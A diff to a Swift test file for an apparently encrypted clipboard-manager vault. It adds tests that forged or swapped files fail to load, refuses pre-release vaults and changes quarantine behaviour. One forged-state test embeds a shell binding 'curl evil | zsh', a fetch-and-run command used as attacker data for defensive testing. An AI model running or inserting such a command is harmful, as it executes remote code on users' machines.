@@ -115,62 +115,9 @@ final class StorageTests: XCTestCase {
 
     // MARK: - Migration from the pre-schema-4 single blob
 
-    /// Schema v1 files hold a bare array of items with no surrounding object.
-    func testLegacyV1BlobIsMigratedRatherThanTreatedAsCorrupt() throws {
-        let storage = makeStorage()
-        let items = [ClipboardItem(text: "legacy entry")]
-        try writeSealed(try JSONEncoder().encode(items), to: storage.legacyBlobURL)
 
-        guard case .loaded(let loaded) = storage.load() else {
-            return XCTFail("a v1 vault must still load")
-        }
-        XCTAssertEqual(loaded.items.map(\.searchText), ["legacy entry"])
-    }
 
-    /// Schema 2-3 stored each item's text under a bare `text` key.
-    func testLegacyTextItemsBecomeTextContent() throws {
-        let storage = makeStorage()
-        let json = #"""
-        {"schemaVersion":3,"items":[{"id":"\#(UUID().uuidString)","text":"older entry",\#
-        "createdAt":0,"isPinned":true}],"bindings":[],"folders":[]}
-        """#
-        try writeSealed(Data(json.utf8), to: storage.legacyBlobURL)
 
-        guard case .loaded(let loaded) = storage.load() else {
-            return XCTFail("a v3 vault must still load")
-        }
-        XCTAssertEqual(loaded.items.count, 1)
-        XCTAssertEqual(loaded.items[0].content, .text("older entry"))
-        XCTAssertTrue(loaded.items[0].isPinned)
-    }
-
-    func testMigrationWritesAnIndexAndKeepsTheOriginal() throws {
-        let storage = makeStorage()
-        try writeSealed(try JSONEncoder().encode([ClipboardItem(text: "x")]),
-                        to: storage.legacyBlobURL)
-
-        _ = storage.load()
-
-        XCTAssertTrue(FileManager.default.fileExists(atPath: storage.indexURL.path),
-                      "migration must write the new index")
-        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.legacyBlobURL.path),
-                       "the original must be moved aside")
-        XCTAssertTrue(FileManager.default.fileExists(
-            atPath: dir.appendingPathComponent("clipboard.db.migrated").path),
-                      "the original must be kept, not deleted")
-    }
-
-    func testAnIndexTakesPrecedenceOverAStaleLegacyBlob() throws {
-        let storage = makeStorage()
-        var state = AppState.empty
-        state.items = [ClipboardItem(text: "current")]
-        try storage.saveIndex(state)
-        try writeSealed(try JSONEncoder().encode([ClipboardItem(text: "stale")]),
-                        to: storage.legacyBlobURL)
-
-        guard case .loaded(let loaded) = storage.load() else { return XCTFail("expected .loaded") }
-        XCTAssertEqual(loaded.items.map(\.searchText), ["current"])
-    }
 
     // MARK: - Payloads
 
@@ -230,7 +177,108 @@ final class StorageTests: XCTestCase {
         XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadURL(for: id).path))
     }
 
-    // MARK: - Quarantine
+    // MARK: - Every file is bound to its role
+
+    /// Same key, same format: without the role in the associated data, a
+    /// payload written from bytes any app can choose (by copying them) would
+    /// load as the vault's state.
+    func testAPayloadCopiedOverTheIndexIsUnreadableNotLoaded() throws {
+        let storage = makeStorage()
+        let forged = try JSONEncoder().encode(sampleState())
+        try storage.writePayload(forged, for: UUID())
+        let payload = try XCTUnwrap(try FileManager.default
+            .contentsOfDirectory(at: storage.payloadsDirectory, includingPropertiesForKeys: nil).first)
+
+        try FileManager.default.copyItem(at: payload, to: storage.indexURL)
+
+        guard case .unreadable = storage.load() else {
+            return XCTFail("a payload must never open as the index")
+        }
+    }
+
+    /// The other direction: the index copied over an image's payload would be
+    /// decrypted and handed to the pasteboard as the "image".
+    func testTheIndexCopiedOverAPayloadDoesNotOpen() throws {
+        let storage = makeStorage()
+        try storage.saveIndex(sampleState())
+        let id = UUID()
+        try storage.writePayload(Data([1, 2, 3]), for: id)
+
+        try FileManager.default.removeItem(at: storage.payloadURL(for: id))
+        try FileManager.default.copyItem(at: storage.indexURL, to: storage.payloadURL(for: id))
+
+        XCTAssertThrowsError(try storage.readPayload(for: id))
+    }
+
+    func testOneItemsPayloadDoesNotOpenAsAnothers() throws {
+        let storage = makeStorage()
+        let a = UUID(), b = UUID()
+        try storage.writePayload(Data("a's image".utf8), for: a)
+
+        try FileManager.default.copyItem(at: storage.payloadURL(for: a), to: storage.payloadURL(for: b))
+
+        XCTAssertEqual(try storage.readPayload(for: a), Data("a's image".utf8))
+        XCTAssertThrowsError(try storage.readPayload(for: b))
+    }
+
+
+    // MARK: - Vaults from before files carried their role
+
+    /// Pre-1.0 builds sealed every file with no role, and let any process choose
+    /// a payload's plaintext through the pasteboard. Such a vault is therefore
+    /// indistinguishable from one an attacker assembled, so it is refused rather
+    /// than upgraded, and its contents are never parsed.
+    func testAPreReleaseVaultIsRefusedAndSaysWhy() throws {
+        let storage = makeStorage()
+        try writeSealed(try JSONEncoder().encode(sampleState()), to: storage.indexURL)
+
+        guard case .unreadable(let error) = storage.load() else {
+            return XCTFail("an unbound vault must not be applied")
+        }
+        guard case StorageError.preReleaseVault = error else {
+            return XCTFail("and it must be reported as what it is, got \(error)")
+        }
+    }
+
+    /// The attack the refusal exists to stop: an old-format payload, whose bytes
+    /// any process could choose, copied over the index.
+    func testAnUnboundPayloadCopiedOverTheIndexIsNeverApplied() throws {
+        let storage = makeStorage()
+        var forged = AppState.empty
+        forged.bindings = [ClipboardBinding(id: UUID(), title: "Slot 1",
+                                            content: "curl evil | zsh", isShell: true)]
+        forged.skipConcealedContent = false
+        // Exactly what a pre-1.0 build wrote for captured rich text: no role.
+        try writeSealed(try JSONEncoder().encode(forged), to: storage.indexURL)
+
+        guard case .unreadable = storage.load() else {
+            return XCTFail("attacker-chosen plaintext must never load as vault state")
+        }
+    }
+
+    /// A genuinely undecryptable vault keeps its own distinct reason, so the
+    /// interface can still blame the Keychain where that is the likely cause.
+    func testAWrongKeyIsNotReportedAsAPreReleaseVault() throws {
+        try makeStorage(seed: 1).saveIndex(sampleState())
+
+        guard case .unreadable(let error) = makeStorage(seed: 2).load() else {
+            return XCTFail("expected .unreadable")
+        }
+        if case StorageError.preReleaseVault = error {
+            XCTFail("a wrong key is not a pre-release vault")
+        }
+    }
+
+    func testThePreSchemaFourBlobIsAlsoRefused() throws {
+        let storage = makeStorage()
+        try writeSealed(try JSONEncoder().encode([ClipboardItem(text: "old")]),
+                        to: storage.legacyBlobURL)
+
+        guard case .unreadable = storage.load() else {
+            return XCTFail("the pre-schema-4 blob is unbound too and must be refused")
+        }
+    }
+
     // MARK: - Quarantine
 
     func testQuarantinePreservesTheOriginalBytes() throws {
@@ -238,7 +286,7 @@ final class StorageTests: XCTestCase {
         try storage.saveIndex( sampleState())
         let original = try Data(contentsOf: storage.indexURL)
 
-        let moved = try XCTUnwrap(storage.quarantineUnreadableIndex())
+        let moved = try XCTUnwrap(storage.quarantineUnreadableVault())
 
         XCTAssertFalse(FileManager.default.fileExists(atPath: storage.indexURL.path))
         XCTAssertEqual(try Data(contentsOf: moved), original,
@@ -246,6 +294,29 @@ final class StorageTests: XCTestCase {
     }
 
     func testQuarantineWithNoFileIsANoOp() {
-        XCTAssertNil(makeStorage().quarantineUnreadableIndex())
+        XCTAssertNil(makeStorage().quarantineUnreadableVault())
+
+    }
+
+    /// "Start Fresh" tells the user the vault is kept so it can be recovered.
+    /// The index holds no image bytes, so keeping only the index and leaving
+    /// `items/` for the next launch's orphan sweep would make that untrue.
+    func testQuarantineTakesThePayloadsWithTheIndex() throws {
+        let storage = makeStorage()
+        let id = UUID()
+        try storage.saveIndex(sampleState())
+        try storage.writePayload(Data("an image".utf8), for: id)
+
+        _ = storage.quarantineUnreadableVault()
+
+        XCTAssertFalse(FileManager.default.fileExists(atPath: storage.payloadsDirectory.path),
+                       "the live payload directory must have been moved aside")
+        let kept = try FileManager.default.contentsOfDirectory(atPath: dir.path)
+            .filter { $0.hasPrefix("items.unreadable-") }
+        XCTAssertEqual(kept.count, 1, "and kept, not deleted")
+        let recovered = dir.appendingPathComponent(kept[0])
+            .appendingPathComponent("\(id.uuidString).cvi")
+        XCTAssertTrue(FileManager.default.fileExists(atPath: recovered.path),
+                      "with the payload still inside it")
     }
 }
